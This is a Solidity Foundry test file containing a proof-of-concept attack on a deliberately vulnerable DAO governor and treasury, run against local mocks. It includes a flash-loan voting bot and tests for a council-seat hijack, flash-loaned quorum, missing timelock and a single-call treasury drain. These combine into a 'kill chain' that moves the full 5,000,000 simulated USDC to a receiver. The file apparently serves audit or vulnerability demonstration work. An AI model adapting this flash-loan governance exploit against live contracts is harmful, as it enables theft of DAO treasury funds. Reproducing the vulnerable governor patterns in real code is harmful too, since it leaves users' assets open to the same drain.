// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test, console2} from "forge-std/Test.sol";
import {MockERC20} from "../contracts/mocks/MockERC20.sol";
import {MockFlashLender, IFlashBorrower} from "../contracts/mocks/MockFlashLender.sol";
import {VulnX100Governor, IVotesLike} from "../contracts/targets/VulnX100Governor.sol";
import {VulnX100Treasury} from "../contracts/targets/VulnX100Treasury.sol";

/// Flash-vote bot: borrows governance tokens, votes YES, repays — one tx.
contract FundFlowBot is IFlashBorrower {
    MockFlashLender lender; MockERC20 token; VulnX100Governor gov; uint256 pid;
    constructor(MockFlashLender l, MockERC20 t, VulnX100Governor g) { lender=l; token=t; gov=g; }
    function voteWithLoan(uint256 _pid, uint256 amount) external { pid=_pid; lender.flashLoan(amount); }
    function onFlashLoan(address t, uint256 amount) external {
        gov.castVote(pid, true);
        MockERC20(t).transfer(address(lender), amount);
    }
}

/// VAULT FUND-FLOW VERIFICATION (vulnerable X100 reconstruction).
/// Proves on a LOCAL EVM, with on-chain state assertions, that 5,000,000
/// SIMULATED USDC actually moves from the DAO treasury to a test receiver.
/// No real assets; no mainnet. Uses the bundled VULN-1..4 target contracts.
contract FundFlowX100Test is Test {
    uint256 constant VAULT_START = 5_000_000e18; // 5,000,000 simulated USDC
    uint256 constant GOV_SUPPLY  = 1_000_000e18;
    uint256 constant LENDER_POOL = 600_000e18;   // > 20% quorum (200,000)

    MockERC20 usdc;
    MockERC20 gt;
    MockFlashLender lender;
    VulnX100Governor gov;
    VulnX100Treasury treasury;

    address attacker = makeAddr("attacker");
    address receiver = makeAddr("receiver");   // test receiving address

    function setUp() public {
        usdc = new MockERC20("USD Coin (SIMULATED)", "USDC");
        gt = new MockERC20("X100 Governance", "X100");
        gov = new VulnX100Governor(IVotesLike(address(gt)));
        treasury = new VulnX100Treasury();
        treasury.setGovernor(address(gov));
        gov.setTreasury(address(treasury));

        // Initialize the simulated DAO treasury with 5,000,000 USDC.
        usdc.mint(address(treasury), VAULT_START);

        // Governance float + flash-loanable pool.
        gt.mint(address(lender = new MockFlashLender(gt)), LENDER_POOL);
        gt.mint(address(0xdead), GOV_SUPPLY - LENDER_POOL);
    }

    // ----- conservation helper: total USDC is fixed and fully accounted -----
    function _conserved() internal view returns (bool) {
        uint256 sum = usdc.balanceOf(address(treasury))
            + usdc.balanceOf(attacker)
            + usdc.balanceOf(receiver)
            + usdc.balanceOf(address(gov))
            + usdc.balanceOf(address(this));
        return sum == usdc.totalSupply() && usdc.totalSupply() == VAULT_START;
    }

    // =====================================================================
    // Per-vulnerability isolation
    // =====================================================================

    /// [VULN-1] Governance control takeover via council re-initialization.
    function test_01_vuln1_seat_hijack_takes_control() public {
        address[] memory evil = new address[](1);
        evil[0] = attacker;
        vm.prank(attacker);
        gov.initializeCouncil(evil);
        assertTrue(gov.isCouncil(attacker), "VULN-1: attacker seated on council");
        vm.prank(attacker);
        gov.setTreasury(attacker); // council-gated pointer now attacker-controlled
        assertEq(address(gov.treasury()), attacker, "VULN-1: attacker controls treasury pointer");
        console2.log("[VULN-1] attacker council seat:", gov.isCouncil(attacker));
    }

    /// [VULN-2] Flash loan reaches quorum with zero attacker-owned tokens.
    function test_02_vuln2_flashloan_reaches_quorum() public {
        uint256 id = gov.propose(address(usdc), 0, "");
        assertEq(gt.balanceOf(attacker), 0, "attacker owns 0 gov tokens");
        FundFlowBot bot = new FundFlowBot(lender, gt, gov);
        vm.prank(attacker);
        bot.voteWithLoan(id, LENDER_POOL);
        (, , uint256 forVotes, , , ) = gov.proposalInfo(id);
        uint256 quorum = (gt.totalSupply() * gov.quorumBps()) / 10000;
        console2.log("[VULN-2] forVotes:", forVotes / 1e18);
        console2.log("[VULN-2] quorum  :", quorum / 1e18);
        assertGt(forVotes, quorum, "VULN-2: quorum cleared with flash-loaned votes");
        assertEq(gt.balanceOf(attacker), 0, "attacker still owns 0 after voting");
    }

    /// [VULN-3] No timelock: execution is immediate once the vote window closes.
    function test_03_vuln3_no_timelock_immediate_execution() public {
        bytes memory data = abi.encodeWithSignature("transfer(address,uint256)", receiver, uint256(1e18));
        uint256 id = gov.propose(address(usdc), 0, data);
        FundFlowBot bot = new FundFlowBot(lender, gt, gov);
        vm.prank(attacker);
        bot.voteWithLoan(id, LENDER_POOL);
        (, , , , uint64 deadline, ) = gov.proposalInfo(id);
        uint256 tExec = deadline + 1;
        vm.warp(tExec);
        gov.execute(id);
        // The only wait was the 1-second voting window; no post-approval delay.
        assertLt(uint256(gov.votingPeriod()), 3600, "VULN-3: no timelock delay window");
        console2.log("[VULN-3] votingPeriod(s):", gov.votingPeriod());
    }

    /// [VULN-4] A single governor-authorized call drains the entire treasury.
    function test_04_vuln4_single_call_drains_treasury() public {
        assertEq(usdc.balanceOf(address(treasury)), VAULT_START, "init vault = 5,000,000");
        // Simulate the governor executing an arbitrary transfer of the FULL balance.
        bytes memory data = abi.encodeWithSignature("transfer(address,uint256)", receiver, VAULT_START);
        vm.prank(address(gov));
        treasury.execute(address(usdc), 0, data);
        assertEq(usdc.balanceOf(address(treasury)), 0, "VULN-4: treasury drained to 0");
        assertEq(usdc.balanceOf(receiver), VAULT_START, "VULN-4: receiver got 5,000,000");
        assertTrue(_conserved(), "asset conservation holds");
    }

    // =====================================================================
    // Combined kill chain — the headline end-to-end fund flow.
    // =====================================================================
    function test_05_combined_killchain_full_vault_drain() public {
        // --- INITIAL on-chain state ---
        uint256 vault0 = usdc.balanceOf(address(treasury));
        uint256 recv0 = usdc.balanceOf(receiver);
        console2.log("=== INITIAL ===");
        console2.log("vault USDC   :", vault0 / 1e18);
        console2.log("receiver USDC:", recv0 / 1e18);
        assertEq(vault0, VAULT_START, "ASSERT initial vault = 5,000,000");
        assertEq(recv0, 0, "ASSERT initial receiver = 0");
        assertTrue(_conserved(), "ASSERT conservation at start");

        // Step 1: attacker submits a drain proposal (propose is permissionless).
        bytes memory drain = abi.encodeWithSignature("transfer(address,uint256)", receiver, VAULT_START);
        vm.prank(attacker);
        uint256 id = gov.propose(address(usdc), 0, drain);

        // Step 2 [VULN-2]: flash-borrow gov tokens and vote YES.
        FundFlowBot bot = new FundFlowBot(lender, gt, gov);
        vm.prank(attacker);
        bot.voteWithLoan(id, LENDER_POOL);
        (, , uint256 forVotes, , uint64 deadline, ) = gov.proposalInfo(id);
        console2.log("=== VOTE (flash-loaned) ===");
        console2.log("forVotes     :", forVotes / 1e18);

        // Step 3 [VULN-3]: no timelock -> execute right after the window closes.
        vm.warp(deadline + 1);
        // Step 4 [VULN-4]: treasury arbitrary call moves the funds.
        gov.execute(id);

        // --- FINAL on-chain state ---
        uint256 vault1 = usdc.balanceOf(address(treasury));
        uint256 recv1 = usdc.balanceOf(receiver);
        console2.log("=== FINAL ===");
        console2.log("vault USDC   :", vault1 / 1e18);
        console2.log("receiver USDC:", recv1 / 1e18);

        // --- CORE ACCEPTANCE ASSERTIONS (real EVM state) ---
        assertEq(vault1, 0, "ASSERT final vault = 0");
        assertEq(recv1, VAULT_START, "ASSERT receiver += 5,000,000");
        assertEq(recv1 - recv0, VAULT_START, "ASSERT receiver delta = 5,000,000");
        assertTrue(_conserved(), "ASSERT conservation after drain");
        assertEq(gt.balanceOf(attacker), 0, "ASSERT attacker paid ~0 token cost");
    }
}
